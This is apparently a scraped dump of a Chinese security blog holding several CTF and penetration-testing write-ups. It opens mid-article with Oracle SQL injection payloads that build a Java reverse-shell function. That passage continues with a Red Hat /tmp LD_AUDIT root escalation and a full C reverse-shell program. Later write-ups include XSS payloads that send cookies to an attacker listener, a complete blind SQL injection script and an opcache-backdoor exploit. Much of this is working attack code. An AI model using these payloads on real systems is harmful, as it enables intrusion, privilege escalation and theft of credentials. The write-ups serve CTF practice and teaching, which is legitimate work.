&emsp;&emsp;这里要注意区分目标系统，如果是linux就要改变执行的命令，否则会报：1服务器无法处理请求。 --&amp;gt; ORA-29532: Java call terminated by uncaught Java exception: java.io.IOException: can&apos;t exec: cmd.exe doesn&apos;t exist &emsp;&emsp;此时尝试换成/bin/bash。&emsp;&emsp; 赋予Java可执行权限&emsp;&emsp;上面只是相当于写了个文件，我们还需要给它加上可执行权限：1' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.net.SocketPermission'''''''', ''''''''&lt;&gt;'''''''', ''''''''*'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual) is not null-- 创建函数1' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function reversetcp RETURN VARCHAR2 as language java name ''''''''shell.run() return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual) is not null-- &emsp;&emsp;这里创建了一个叫reversetcp的函数，函数里引用了上面我们创建的shell类(shell.run())。 赋予函数执行权限1' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on reversetcp to public'''';END;'';END;--','SYS',0,'1',0) from dual) is not null-- 执行reversetcp函数1' and (select sys.reversetcp from dual) is not null-- &emsp;&emsp;至此，就能将shell反弹到你的VPS里。 提权&emsp;&emsp;一般oracle的用户的权限不会太高，所以我们要提至root。 &emsp;&emsp;首先对目标服务器做个信息收集(截选)：12345678whoamioracleuname -r2.6.18cat /etc/issueRed Hat release 5.3 &emsp;&emsp;在redhat5-6的系统中存在/tmp 777权限提权的漏洞。 &emsp;&emsp;在/tmp下创建一个.redhat的目录：1mkdir .redhat &emsp;&emsp;接着利用ping这个命令，ping的权限很特殊是S，可以在普通用户使用这个命令的时候瞬间拥有这个命令的属主权限，这里是root.1ln /bin/ping /tmp/.redhat/target &emsp;&emsp;再接着：1234exec 3&lt; /tmp/.redhat/target# 删除rm -rf /tmp/.redhat/ &emsp;&emsp;接着找个C语言版的shell：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;netinet/in.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;netinet/in.h&gt;#include &lt;netdb.h&gt;void usage();char shell[]=\"/bin/sh\";char message[]=\"hacker welcomen\";int sock;int main(int argc, char *argv[]) {if(argc &lt;3){usage(argv[0]);}struct sockaddr_in server;if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {printf(\"Couldn't make socket!n\"); exit(-1);}server.sin_family = AF_INET;server.sin_port = htons(atoi(argv[2]));server.sin_addr.s_addr = inet_addr(argv[1]);if(connect(sock, (struct sockaddr *)&amp;server, sizeof(struct sockaddr)) == -1) {printf(\"Could not connect to remote shell!n\");exit(-1);}send(sock, message, sizeof(message), 0);dup2(sock, 0);dup2(sock, 1);dup2(sock, 2);execl(shell,\"/bin/sh\",(char *)0);close(sock);return 1;}void usage(char *prog[]) {printf(\"Usage: %s &lt;reflect ip&gt; &lt;port&gt;n\", prog);exit(-1);} &emsp;&emsp;编译：1gcc -w -fPIC -shared -o /tmp/.redhat oracle.c &emsp;&emsp;运行：1LD_AUDIT=\"\\$ORIGIN\" exec /proc/self/fd/3 &emsp;&emsp;即可得到一个root shell： 参考链接&emsp;&emsp;http://blog.51cto.com/akhack/1741615 &emsp;&emsp;https://www.cnblogs.com/chuanzifan/archive/2012/05/13/2497717.html &emsp;&emsp;https://github.com/sqlmapproject/sqlmap/wiki/Usage &emsp;&emsp;https://www.iswin.org/2015/06/13/hack-oracle/ &emsp;&emsp;https://blog.csdn.net/han_dongwei/article/details/40870197 &emsp;&emsp;HTTPie: a CLI, cURL-like tool for humans &emsp;&emsp;https://www.t00ls.net/viewthread.php?tid=43881&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/10/oracle-sqli-get-shell/"},{"title":"2018强网杯Web部分writeup","text":"WebWeb签到&emsp;&emsp;这道题考的是MD5绕过，一共有三关，前面两个直接使用数组绕过即可，如下： &emsp;&emsp;第三个则需要找到两个真正相同的MD5的值，代码如下：123if((string)$_POST['param1']!==(string)$_POST['param2'] &amp;&amp; md5($_POST['param1'])===md5($_POST['param2'])){ die(\"success!\"); }&emsp;&emsp;string将数组转换成'array'所以无法使用数组进行绕过。&emsp;&emsp;这里google了两个图片。 &emsp;&emsp;我们使用python将文件读取出来并进行url编码。12&gt;&gt;&gt; import urllib&gt;&gt;&gt; urllib.quote(open(\"md5_1.jpg\", \"rb\").read())&emsp;&emsp;然后提交即可。 &emsp;&emsp;参考链接：&emsp;&emsp;&emsp;&emsp;Sha1碰撞&emsp;&emsp;&emsp;&emsp;md5相同的图片## three hit&emsp;&emsp;这道题绕了好久，主要是思路被带偏了，实话就是自己太年轻。。。&emsp;&emsp;首先注册的时候会发现后台对username跟age都有过滤，age只允许数字。 &emsp;&emsp;然后我们尝试一下16进制是否可以。我们将要注入的字符进行16进制编码一下。 &emsp;&emsp;所以POC就已经出来了，而且还没有任何过滤，接着我们构造如下payload：11 and ascii(substr((select flag from flag),1,1))&gt;100&emsp;&emsp;然后逐一判断即可得到flag。这里需要注意的是我们要使用ascii作为判断条件而不要使用substr防止得到大小写不准确的flag。### ——————————–后期复现分割线——————————–## Python is the best language 1&emsp;&emsp;flask代码审计，在form.py的表单里只有PostForm是没有过滤的，其他表单中都存在过滤函数。 &emsp;&emsp;而这个表单在/index下被引用。 &emsp;&emsp;再看看Add()函数。 &emsp;&emsp;现在可以确定注入点就在这里。我们试一下：1'|conv(hex(substr(user(),1,4)),16, 10)|'&emsp;&emsp;然后回显： &emsp;&emsp;说明确实存在注入，接着就是找表和字段，123'|conv(hex(substr((select table_name from information_schema.tables where table_schema=database()),1,4)),16,10)|''|conv(hex(substr((select column_name from information_schema.columns where table_name=0x666c616161616167 limit 0,1),1,4)),16,10)|'&emsp;&emsp;结果就是表名：flaaaaag，列名：flllllag。payload：1'|conv(hex(substr((select flllllag from flaaaaag),1,4)),16,10)|'&emsp;&emsp;最终flag：QWB{us1ng_val1dator_caut1ous}## Share your mind&emsp;&emsp;这道题考察的是RPO(Relative Path Overwrite)相对路径覆盖利用，如何判断的呢： 1、路由问题 &emsp;&emsp;可以看到，这里加了/aaaa它还是能正确找到这份文件，所以如果我们在这个页面中写了一些js代码，并且以js去运行解析它的话就会造成任意js代码执行。 2、页面的js文件采用相对地址引入 &emsp;&emsp;注意前面的../。* 3、浏览器和服务器对%2f的定义不同&emsp;&emsp;服务器在接收到%2f的时候会把它转化成/，当作目录解析。如：12345http://39.107.33.96:20000/index.php/view/article/1111/aaa/..%2f..%2f../转化成：http://39.107.33.96:20000/index.php/view/article/1111/aaa/../../../最终：http://39.107.33.96:20000/index.php/view/&emsp;&emsp;这里要注意的是浏览器在请求js、css文件时是以当前url的目录为基准的，然后在后面拼接js、css的地址，接着在请求该js、css。如：1234567http://39.107.33.96:20000/index.php/view/article/1111%27aaa浏览器中的目录：http://39.107.33.96:20000/index.php/view/article/拼接js地址：http://39.107.33.96:20000/index.php/view/article/../static/js/jquery.min.js最终：http://39.107.33.96:20000/index.php/view/static/js/jquery.min.js&emsp;&emsp;这是因为1111%27aaa被当作了一个文件，而不是你想的/1111/aaa中1111是目录。&emsp;&emsp;我们首先插个弹窗，然后查看下raw。 &emsp;&emsp;然后我们构造如下payload：1http://39.107.33.96:20000/index.php/view/article/1111/aaa/..%2f..%2f../ &emsp;&emsp;可以看到已经弹窗，我们再看一下网络请求。 &emsp;&emsp;可以发现它把我们view raw中的代码作为js解析了。&emsp;&emsp;而经过测试，在report页面中是存在xss的。 &emsp;&emsp;但这道题的点不在这，我们回到RPO的利用中来，因为过滤了&lt;&gt;，所以我们用eval(String.fromCharCode(xxx))来绕过，所以payload：1234567891011121314s=\"\"\"var i=document.createElement(\"iframe\");i.src=\"/\";i.id=\"a\";document.body.appendChild(i);i.onload = function (){ var c=document.getElementById('a').contentWindow.document.cookie; location.href=\"http://ip:8888?xx=\"+c;}\"\"\"print \"eval(String.fromCharCode(\",for i in s: print str(ord(i))+\",\",print \"))\",&emsp;&emsp;我们把它插入到write article里，然后获取到它的url，如： &emsp;&emsp;服务器端启动监听：nc -tlp 8888。&emsp;&emsp;然后提交攻击链接：1http://39.107.33.96:20000/index.php/view/article/1198/aaaaa/..%2f..%2f../&emsp;&emsp;接着就能在服务器上收到hint。 &emsp;&emsp;这里提示flag在/QWB_fl4g/QWB/下的cookie中，所以我们将iframe的src=/QWB_fl4g/QWB/。代码如下：1234567891011121314s=\"\"\"var i=document.createElement(\"iframe\");i.src=\"/QWB_fl4g/QWB/\";i.id=\"a\";document.body.appendChild(i);i.onload = function (){ var c=document.getElementById('a').contentWindow.document.cookie; location.href=\"http://ip:8888?xx=\"+c;}\"\"\"print \"eval(String.fromCharCode(\",for i in s: print str(ord(i))+\",\",print \"))\",&emsp;&emsp;跟上面同样的套路走起，最终获得flag：QWB{flag_is_f43kth4rpo}。 &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/03/qwb-web-writeup/"},{"title":"python sql盲注脚本","text":"前言&emsp;&emsp;sql注入中要数盲注比较慢，尤其是没有脚本辅助的情况下，所以写个sql盲注的脚本在ctf中有比较重要的作用。此文的程序语言为python。下面的脚本是对pragyan ctf web4的解决方案，所以payload中使用了base64编码，这里遇到一个小坑，比赛的时候使用base64.b64encode()发生了编码错误，又因为时间紧张，所以就放缓了脚本的编写，但现在已经解决了加密的编码问题。 &emsp;&emsp;python3 base64编码问题的解决方法为：1234# 先将string型的test3转换成bytes加密testi = base64.b64encode(test3.encode('utf-8'))# 再将bytes型的testi转换成stringtesti = str(testi, encoding='utf-8') &emsp;&emsp;脚本中为了提高爆破效率使用了二分查找的方法，并且使用返回页面的大小作为正确与否的判断，详细代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219# -*- coding:utf-8 -*-from time import sleepimport requestsimport base64# 适用于poc: 1' or 1=1 -- +url = 'http://128.199.224.175:24000/'poc1 = \"1' or 1=1 -- +\"sqli = base64.b64encode(poc1.encode('utf-8'))sqli = str(sqli, encoding='utf-8')params = {'spy_name': sqli}html = requests.post(url, params)r = html.textright_len = len(r)poc2 = \"1' or 1=2 -- +\"sqli = base64.b64encode(poc2.encode('utf-8'))sqli = str(sqli, encoding='utf-8')params = {'spy_name': sqli}html = requests.post(url, params)r = html.textwrong_len = len(r)judge = wrong_len + (right_len - wrong_len) // 2def fuzz(sql, test, pos1, pos2, tmp): left = 32 right = 127 while True: mid = (left + right) // 2 # print('正在测试字符：', str(mid)) test3 = test.format(pos1 - 1, pos2, mid) testi = base64.b64encode(test3.encode('utf-8')) testi = str(testi, encoding='utf-8') params = {'spy_name': testi} html = requests.post(url, params) r = html.text if len(r) &gt; judge: tmp += chr(mid) return tmp sqli = sql.format(pos1 - 1, pos2, mid) sqli = base64.b64encode(sqli.encode('utf-8')) sqli = str(sqli, encoding='utf-8') params = {'spy_name': sqli} html = requests.post(url, params) r = html.text if len(r) &gt; judge: left = mid else: right = middatabase = ''sql = \"1' or (ascii(substr(database(),{0},1)))&gt;{1} -- +\"test = \"1' or (ascii(substr(database(),{0},1)))={1} -- +\"for pos in range(1, 50): # 测试length(database())，一旦超过长度则不用再执行。 test2 = sql.format(pos,1) sqli = base64.b64encode(test2.encode('utf-8')) sqli = str(sqli, encoding='utf-8') params = {'spy_name': sqli} html = requests.post(url, params) r = html.text if len(r) &lt; judge: print('======================') print('[*]database: ',database) print('======================\\n') break left = 32 right = 127 while True: mid = (left + right) // 2 # print('正在测试字符：', str(mid)) test3 = test.format(pos, mid) testi = base64.b64encode(test3.encode('utf-8')) testi = str(testi, encoding='utf-8') params = {'spy_name': testi} html = requests.post(url, params) r = html.text if len(r) &gt; judge: database += chr(mid) print('[+]database: ', database) break sqli = sql.format(pos, mid) sqli = base64.b64encode(sqli.encode('utf-8')) sqli = str(sqli, encoding='utf-8') params = {'spy_name': sqli} html = requests.post(url, params) r = html.text if len(r) &gt; judge: left = mid else: right = midtables_name = {}sql = \"1' or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {0},1),{1},1)))&gt;{2} -- +\"test = \"1' or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {0},1),{1},1)))={2} -- +\"for table_num in range(1, 20): sqli = sql.format(table_num - 1, 1, 1) sqli = base64.b64encode(sqli.encode('utf-8')) sqli = str(sqli, encoding='utf-8') params = {'spy_name': sqli} html = requests.post(url, params) r = html.text if len(r) &lt; judge: print('[*]已无其他表！') break print('[+]正在爆破表', str(table_num)) table = '' for str_num in range(1, 50): # 测试length(database())，一旦超过长度则不用再执行。 test2 = sql.format(table_num - 1, str_num, 1) sqli = base64.b64encode(test2.encode('utf-8')) sqli = str(sqli, encoding='utf-8') params = {'spy_name': sqli} html = requests.post(url, params) r = html.text if len(r) &lt; judge: print('======================') print('[*]table: ', table) tables_name[table_num] = table print('======================\\n') break table = fuzz(sql, test, table_num, str_num, table) print('[+]table: ', table)print('******************')for key in tables_name: print('[*]table' + str(key) + ': ' + tables_name[key])print('******************\\n')tb = int(input('&gt;请选择需要爆破的表(数字)：'))# for tb in tables_name:sql = \"1' or (ascii(substr((select column_name from information_schema.columns where table_name='\" + tables_name[tb]+ \"' limit {0},1),{1},1)))&gt;{2} -- +\"test = \"1' or (ascii(substr((select column_name from information_schema.columns where table_name='\" + tables_name[tb]+ \"' limit {0},1),{1},1)))={2} -- +\"colunms_name = {}for column_num in range(1, 20): sqli = sql.format(column_num - 1, 1, 1) sqli = base64.b64encode(sqli.encode('utf-8')) sqli = str(sqli, encoding='utf-8') params = {'spy_name': sqli} html = requests.post(url, params) r = html.text if len(r) &lt; judge: print('[*]已无其他字段！') break print('[+]正在爆破字段', str(column_num)) column = '' for str_num in range(1, 50): # 测试length(database())，一旦超过长度则不用再执行。 test2 = sql.format(column_num - 1, str_num, 1) sqli = base64.b64encode(test2.encode('utf-8')) sqli = str(sqli, encoding='utf-8') params = {'spy_name': sqli} html = requests.post(url, params) r = html.text if len(r) &lt; judge: print('======================') print('[*]column: ', column) colunms_name[column_num] = column print('======================\\n') break column = fuzz(sql, test, column_num, str_num, column) print('[+]column: ', column)print('******************')for key in colunms_name: print('[*]column' + str(key) + ': ' + colunms_name[key])print('******************\\n')cl = int(input('&gt;请选择需要爆破的字段(数字)：'))sql = \"1' or (ascii(substr(( select \" + colunms_name[cl] + \" from \" + tables_name[tb]+ \" limit {0},1),{1},1)))&gt;{2} -- +\"test = \"1' or (ascii(substr(( select \" + colunms_name[cl] + \" from \" + tables_name[tb]+ \" limit {0},1),{1},1)))={2} -- +\"key = []for num in range(1, 20): sqli = sql.format(num - 1, 1, 1) sqli = base64.b64encode(sqli.encode('utf-8')) sqli = str(sqli, encoding='utf-8') params = {'spy_name': sqli} html = requests.post(url, params) r = html.text if len(r) &lt; judge: print('[*]已无其他值！') break print('[+]正在爆破第', str(num)) tmp_key = '' for str_num in range(1, 50): # 测试length(database())，一旦超过长度则不用再执行。 test2 = sql.format(num - 1, str_num, 1) sqli = base64.b64encode(test2.encode('utf-8')) sqli = str(sqli, encoding='utf-8') params = {'spy_name': sqli} html = requests.post(url, params) r = html.text if len(r) &lt; judge: print('======================') print('[*]key: ', tmp_key) key.append(tmp_key) print('======================\\n') break tmp_key = fuzz(sql, test, num, str_num, tmp_key) print('[+]key: ', tmp_key)print('******************')for tt in key: print('[*]key: ' + tt)print('******************\\n') &emsp;&emsp;上面的代码还可以优化，比如增加sqlmap中的–dump功能，将所有的表跟字段都爆破出来。","link":"/2018/03/sql-blind-injection-python/"},{"title":"2018 TCTF-0CTF ezDoor writeup","text":"前言&emsp;&emsp;这次比赛真真感受到了差距，，，这场CTF就是大佬的竞赛场。。。。 ezDoor&emsp;&emsp;源码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?phperror_reporting(0);$dir = 'sandbox/' . sha1($_SERVER['REMOTE_ADDR']) . '/';if(!file_exists($dir)){ mkdir($dir);}if(!file_exists($dir . \"index.php\")){ touch($dir . \"index.php\");}function clear($dir){ if(!is_dir($dir)){ unlink($dir); return; } foreach (scandir($dir) as $file) { if (in_array($file, [\".\", \"..\"])) { continue; } unlink($dir . $file); } rmdir($dir);}switch ($_GET[\"action\"] ?? \"\") { case 'pwd': echo $dir; break; case 'phpinfo': echo file_get_contents(\"phpinfo.txt\"); break; case 'reset': clear($dir); break; case 'time': echo time(); break; case 'upload': if (!isset($_GET[\"name\"]) || !isset($_FILES['file'])) { break; } if ($_FILES['file']['size'] &gt; 100000) { clear($dir); break; } $name = $dir . $_GET[\"name\"]; if (preg_match(\"/[^a-zA-Z0-9.\\/]/\", $name) || stristr(pathinfo($name)[\"extension\"], \"h\")) { break; } move_uploaded_file($_FILES['file']['tmp_name'], $name); $size = 0; foreach (scandir($dir) as $file) { if (in_array($file, [\".\", \"..\"])) { continue; } $size += filesize($dir . $file); } if ($size &gt; 100000) { clear($dir); } break; case 'shell': ini_set(\"open_basedir\", \"/var/www/html/$dir:/var/www/html/flag\"); include $dir . \"index.php\"; break; default: highlight_file(__FILE__); break;} &emsp;&emsp;这道题的目的很明显，就是替换掉$dir下的&quot;index.php&quot;，使得在文件包含的时候执行我们的代码，但在比赛过程中却没能找到突破点，后来看writeup才知道OPcache的知识点。见识限制了我的flag。。。。 &emsp;&emsp;PPS：这道题的覆盖方法又从大佬的博客中学到了一招，我们把上传的名字改成：name=x/../index.php/.，然后上传，即可覆盖掉原有的index.php。 1&lt;?phpecho \"23333\";?&gt; &emsp;&emsp;下面是正常解： &emsp;&emsp;所以这道题的考点就是利用OPcache缓存cache去get shell。关于Opcache的简单介绍如下： Opcache是一种通过将解析的PHP脚本预编译的字节码存放在共享内存中来避免每次加载和解析PHP脚本的开销，解析器可以直接从共享内存读取已经缓存的字节码，从而大大提高PHP的执行效率。 &emsp;&emsp;当服务器开启OPcache的时候会把正常访问过的文件进行生成缓存文件，然后放到指定的缓存目录下。例如： &emsp;&emsp;假设缓存根目录为：/tmp/cache；你访问的文件为：/var/www/html/index.php；那么就会生成：/tmp/cache/[system_id]/var/www/html/index.php.bin。如果以后再访问index.php就会从/tmp/cache/[system_id]/var/www/html/index.php.bin文件中读取数据。 &emsp;&emsp;而这里的system_id依照以下规则生成：12345import hashlibphp_version = \"7.0.28\"zend_extension_id = \"API320151012,NTS\"zend_bin_id = \"BIN_SIZEOF_CHAR48888\"system_id = hashlib.md5(php_version+zend_extension_id+zend_bin_id).hexdigest() &emsp;&emsp;所以我们的目的就转换成上传opcache缓存文件到指定的目录下。 &emsp;&emsp;我们先本地搭建一个跟服务器类似的环境，我们修改php7的配置文件如下：1234opcache.enable=1opcache.validate_timestamps=1opcache.file_cache= \"/var/www/html/cache\"opcache.file_cache_only=1 &emsp;&emsp;这里的缓存文件目录可以跟题目给出的/tmp/cache不同，而且在本地搭建的时候发现如果改成/tmp/cache，apache就启动失败。。 &emsp;&emsp;首先我们先得到服务器上的地址，然后本地生成相同的目录文件，并在index.php中写入你想执行的语句。 &emsp;&emsp;然后访问这个文件生成缓存文件。 &emsp;&emsp;接着我们修改一下这个文件，使它符合题目的要求。修改如下，system_id可以通过上述脚本生成，时间通过如下脚本生成：1234import requestsprint requests.get('http://202.120.7.217:9527/index.php?action=time').contentprint requests.get('http://202.120.7.217:9527/index.php?action=reset').contentprint requests.get('http://202.120.7.217:9527/index.php?action=time').content &emsp;&emsp;注意需要将时间转成16进制，最终结果： &emsp;&emsp;我们上传的目标地址是：1../../../../../tmp/cache/7badddeddbd076fe8352e80d8ddf3e73/var/www/html/sandbox/9549f3458b234bf288beb2cbc30bef119e5f3a91/index.php.bin &emsp;&emsp;在本地写个上传脚本：1234567&lt;form target=\"_blank\" action=\"http://202.120.7.217:9527/?action=upload&amp;name=../../../../../tmp/cache/7badddeddbd076fe8352e80d8ddf3e73/var/www/html/sandbox/9549f3458b234bf288beb2cbc30bef119e5f3a91/index.php.bin\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;h2&gt;&lt;br&gt;文件上传&lt;br&gt;&lt;/h2&gt; &lt;label for=\"file\"&gt;Filename:&lt;/label&gt; &lt;input type=\"file\" name=\"file\" id=\"file\" /&gt; &lt;br /&gt; &lt;input type=\"submit\" name=\"submit\" value=\"Submit\" /&gt;&lt;/form&gt; &emsp;&emsp;上传，访问，然后会发现一片空白。。。。这也是我疑惑的地方，后来认真看其他的writeup才知道后台过滤了一些函数。 &emsp;&emsp;能用的payload为：12&lt;?phpprint_r(scandir('/var/www/html/flag')); &emsp;&emsp;我们再进行上面的操作，发现确实可行，我们可以发现一个文件。 &emsp;&emsp;读取文件内容。12&lt;?phpprint_r(file_get_contents('/var/www/html/flag/93f4c28c0cf0b07dfd7012dca2cb868cc0228cad')); &emsp;&emsp;再次上传，访问。 &emsp;&emsp;可以得到一堆乱码的内容，但可以看出还是opcache生成的缓存文件，我们尝试恢复一下。12345import requestshtml = requests.get('http://202.120.7.217:9527/index.php?action=shell').contentfile = open('flag.bin', 'wb')file.write(html)file.close() &emsp;&emsp;在对比正常的文件后发现缺少了个00字节，所以给补上。 &emsp;&emsp;使用工具将flag.bin还原成汇编，地址：Github。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182root@kali:~/php7-opcache-override/analysis_tools# ./opcache_disassembler.py -c -a64 flag.bin function encrypt() { #0 !0 = RECV(None, None); #1 !0 = RECV(None, None); #2 DO_FCALL_BY_NAME(None, 'mt_srand'); #3 SEND_VAL(1337, None); #4 (129)?(None, None); #5 ASSIGN(!0, ''); #6 (121)?(!0, None); #7 ASSIGN(None, None); #8 (121)?(!0, None); #9 ASSIGN(None, None); #10 ASSIGN(None, 0); #11 JMP(-&gt;-24, None); #12 DO_FCALL_BY_NAME(None, 'chr'); #13 DO_FCALL_BY_NAME(None, 'ord'); #14 FETCH_DIM_R(!0, None); #15 (117)?(None, None); #16 (129)?(None, None); #17 DO_FCALL_BY_NAME(None, 'ord'); #18 MOD(None, None); #19 FETCH_DIM_R(!0, None); #20 (117)?(None, None); #21 (129)?(None, None); #22 BW_XOR(None, None); #23 DO_FCALL_BY_NAME(None, 'mt_rand'); #24 SEND_VAL(0, None); #25 SEND_VAL(255, None); #26 (129)?(None, None); #27 BW_XOR(None, None); #28 SEND_VAL(None, None); #29 (129)?(None, None); #30 ASSIGN_CONCAT(!0, None); #31 PRE_INC(None, None); #32 IS_SMALLER(None, None); #33 JMPNZ(None, -&gt;134217662); #34 DO_FCALL_BY_NAME(None, 'encode'); #35 (117)?(!0, None); #36 (130)?(None, None); #37 RETURN(None, None);}function encode() { #0 RECV(None, None); #1 ASSIGN(None, ''); #2 ASSIGN(None, 0); #3 JMP(-&gt;-81, None); #4 DO_FCALL_BY_NAME(None, 'dechex'); #5 DO_FCALL_BY_NAME(None, 'ord'); #6 FETCH_DIM_R(None, None); #7 (117)?(None, None); #8 (129)?(None, None); #9 (117)?(None, None); #10 (129)?(None, None); #11 ASSIGN(None, None); #12 (121)?(None, None); #13 IS_EQUAL(None, 1); #14 JMPZ(None, -&gt;-94); #15 CONCAT('0', None); #16 ASSIGN_CONCAT(None, None); #17 JMP(-&gt;-96, None); #18 ASSIGN_CONCAT(None, None); #19 PRE_INC(None, None); #20 (121)?(None, None); #21 IS_SMALLER(None, None); #22 JMPNZ(None, -&gt;134217612); #23 RETURN(None, None);}#0 ASSIGN(None, 'input_your_flag_here');#1 DO_FCALL_BY_NAME(None, 'encrypt');#2 SEND_VAL('this_is_a_very_secret_key', None);#3 (117)?(None, None);#4 (130)?(None, None);#5 IS_IDENTICAL(None, '85b954fc8380a466276e4a48249ddd4a199fc34e5b061464e4295fc5020c88bfd8545519ab');#6 JMPZ(None, -&gt;-136);#7 ECHO('Congratulation! You got it!', None);#8 EXIT(None, None);#9 ECHO('Wrong Answer', None);#10 EXIT(None, None); &emsp;&emsp;接下来就是逆向了。另外一种查看opcache代码的工具就是VLD插件。 &emsp;&emsp;由于逆向没有经验，所以直接放出dalao的结果：12345678910111213def encode(data): return output.encode('hex')def encrypt(flag,strings): mt_srand(1337) output = \"\" for i in range(len(flag)): output += chr(ord(flag[i])^ord(strings[i])^mt_rand(0,255)) return encode(output)flag = raw_input('input_your_flag_here')if encrypt(flag,this_is_a_very_secret_key)===\"85b954fc8380a466276e4a48249ddd4a199fc34e5b061464e4295fc5020c88bfd8545519ab\": print 'Congratulation! You got it!'else: 'Wrong Answer' &emsp;&emsp;解密脚本：12345678910data = [151,189,92,232,167,217,167,90,114,82,84,72,9,134,182,90,23,152,129,27,93,6,22,114,194,105,104,203,65,60,215,147,238,81,111,91,179,57,195,148,8,72,61,71,122,91,137,196,223,225,76,134,196,244,114]opt = \"85b954fc8380a466276e4a48249ddd4a199fc34e5b061464e4295fc5020c88bfd8545519ab\".decode(\"hex\")data2 = \"this_is_a_very_secret_key\"flag = \"\"for i in range(len(opt)): flag += chr(data[i]^ord(opt[i])^ord(data2[i%len(data2)]))print flag &emsp;&emsp;最后得到flag：flag{0pc4che_b4ckd00r_is_4_g0o6_ide4}。 总结&emsp;&emsp;这道题是没有一点花花肠子的，源码、目的都非常明确，自己在做题的过程中也在不断的google，包括扩展名绕过、linux是不是有什么文件覆盖的新套路等等，但都没有正确的get到出题人的意思，归根结底还是自己的基础知识太过薄弱，，还有就是信息搜索的能力不够强大，当时还真有念头把phpinfo的每个模块都拿出来google一下，但结果却没有执行。以后一定得注意对phpinfo的内容进行深入挖掘！ &emsp;&emsp;参考链接： &emsp;&emsp;&emsp;&emsp;https://www.cdxy.me/?p=790 &emsp;&emsp;&emsp;&emsp;https://www.bertramc.cn/2018/04/02/53.html &emsp;&emsp;&emsp;&emsp;https://github.com/GoSecure/php7-opcache-override&emsp;&emsp;&emsp;&emsp;http://gosecure.net/2016/04/27/binary-webshell-through-opcache-in-php-7/","link":"/2018/04/tctf-0ctf-writeup/"},{"title":"Wechall WriteUp","text":"初入ctf，写下记录以便查看。这里是wechall的一些题解。 目录 Training: Tracks (HTTP) Training: Baconian (Stegano, Encoding, Crypto, Training) Repeating History (Research) PHP 0818 (Exploit, PHP) Warchall: Live LFI (Linux, Exploit, Warchall) Warchall: Live RFI (Linux, Exploit, Warchall) Can you read me (Coding, Image) 1. Training: Tracks (HTTP) 1、进入投票页面 点击 + 号， 再次点击进行投票。 此时完成第一次投票。进行第二次时会报错。 这时，我们将VOTE cookie删掉，如果不删会导致后续不成功。 打开burpsuite，抓包改包。修改If-None-Match的值，请求更新数据，因为服务器一开始会分配Etag，然后下次检测时会对比两者的值，如果一样就不更新数据，导致无法投票。 然后投票成功，通过题目。 2、Training: Baconian (Stegano, Encoding, Crypto, Training)这题是解密培根密码，培根密码有两种密码表，并使用’A’、’B’代替0，1进行编码。第一种密码表： 第二种密码表： 假如我要加密‘hello’，按照第一种方法加密的结果为：aabbb,aabaa,ababa,ababa,abbab；第二种为：aabbb,aabaa,ababb,ababb,abbba。假如要解密‘WOrld…’，把整个字符串的大小写代表着‘A’、‘B’编码，所以这里有两个编码可能性，一是大写代表‘A’，小写代表‘B’，第二种相反。同时这里又有两种密码表，所以这里一共有2*2=4种可能性。大写代表‘A’，小写代表‘B’，用第一种密码表可得：‘h’，第二种为：‘h’，这里刚好一样。大写代表‘B’，小写代表‘A’，用第一种密码表没有结果，第二种为：‘y’。 所以将题目中给出的字符进行清洗，去除非字母字符包括数字。然后写个python脚本 。 1234567891011121314151617181920212223242526272829303132333435363738import reStr = ‘………..’arr = re.findall('.{5}', str)alphabet = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']first_cipher = 